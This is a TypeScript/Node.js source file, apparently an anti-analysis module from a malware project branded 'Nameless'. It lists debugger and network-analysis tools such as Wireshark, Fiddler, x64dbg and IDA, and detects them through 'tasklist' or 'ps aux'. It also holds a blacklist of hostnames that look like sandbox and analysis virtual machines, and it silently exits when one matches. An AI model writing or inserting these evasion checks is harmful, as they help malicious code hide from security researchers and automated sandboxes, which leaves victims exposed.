interface antidebugger {
    name: string;
    running: boolean;
  }
  
  const processesToCheck: antidebugger[] = [
    { name: "fiddler.exe", running: false }, 
    { name: "wireshark.exe", running: false }, 
    { name: "http debugger.exe", running: false },
    { name: "packet.exe", running: false },
    { name: "prozzes hacker 2.exe", running: false },
    { name: "x64dbg.exe", running: false },
    { name: "x32dbg.exe", running: false },
    { name: "x96dbg.exe", running: false },
    { name: "ida.exe", running: false },
    { name: "CFF Explorer.exe", running: false },
    { name: "Scylla.exe", running: false },
    { name: "PEiD.exe", running: false },
    { name: "WinHex.exe", running: false },
    { name: "Hiew.exe", running: false },
    { name: "IDA pro.exe", running: false },


    
  ];
  

  async function checkIfProcessesRunning(processes: antidebugger[]): Promise<antidebugger[]> {
    const { exec } = require("child_process");
  
    return new Promise<antidebugger[]>((resolve) => {
      if (process.platform === "win32") {
        exec("tasklist", (error: { message: any; }, stdout: string) => {
          if (error) {
            console.error(`Fehler beim Ausführen des Befehls: ${error.message}`);
            resolve(processes);
            return;
          }
  
          processes.forEach((process) => {
            process.running = stdout.toLowerCase().indexOf(process.name.toLowerCase()) > -1;
          });
  
          resolve(processes);
        });
      } else if (process.platform === "darwin" || process.platform === "linux") {
        exec("ps aux", (error: { message: any; }, stdout: string) => {
          if (error) {
            console.error(`Error executing anti debugg detection... ${error.message}`);
            resolve(processes);
            return;
          }
  
          processes.forEach((process) => {
            process.running = stdout.toLowerCase().indexOf(process.name.toLowerCase()) > -1;
          });
  
          resolve(processes);
        });
      } else {
        console.error(`Not supportet OS: ${process.platform}`);
        resolve(processes);
      }
    });
  }
  
  checkIfProcessesRunning(processesToCheck)
    .then((updatedProcesses) => {
      updatedProcesses.forEach((process) => {
        if (process.running) {
            console.clear();
          console.log("debugger detected");
        } else {
          
        }
      });
    })
    .catch((error) => {
      console.error(`Error checking programms for debugger: ${error}`);
    });
  
    const NAMES = [
        "BEE7370C-8C0C-4",
        "DESKTOP-NAKFFMT",
        "WIN-5E07COS9ALR",
        "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG",
        "Q9IATRKPRH",
        "XC64ZB",
        "DESKTOP-D019GDM",
        "DESKTOP-WI8CLET",
        "SERVER1",
        "LISA-PC",
        "JOHN-PC",
        "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R",
        "WILEYPC",
        "WORK",
        "6C4E733F-C2D9-4",
        "RALPHS-PC",
        "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O",
        "QarZhrdBpj",
        "ORELEEPC",
        "ARCHIBALDPC",
        "JULIA-PC",
        "d1bnJkfVlH",
        "NETTYPC",
        "DESKTOP-BUGIO",
        "DESKTOP-CBGPFEE",
        "SERVER-PC",
        "TIQIYLA9TW5M",
        "DESKTOP-KALVINO",
        "COMPNAME_4047",
        "DESKTOP-19OLLTD",
        "DESKTOP-DE369SE",
        "EA8C2E2A-D017-4",
        "AIDANPC",
        "LUCAS-PC",
        "ACEPC",
        "MIKE-PC",
        "DESKTOP-IAPKN1P",
        "DESKTOP-NTU7VUO",
        "LOUISE-PC",
        "T00917",
        "test42",
        "DESKTOP-CM0DAW8",
      ];
      
      function checkComputerName(): void {
        const os = require("os");
        const computerName = os.hostname();
      
        if (NAMES.includes(computerName)) {
          console.log(`The Name "${computerName}" is untrusted. Nameless dont support them..`);
          process.exit(0);
        } else {
          console.log(``);
        }
      }
      
console.log("everything is working fine..");

      checkComputerName();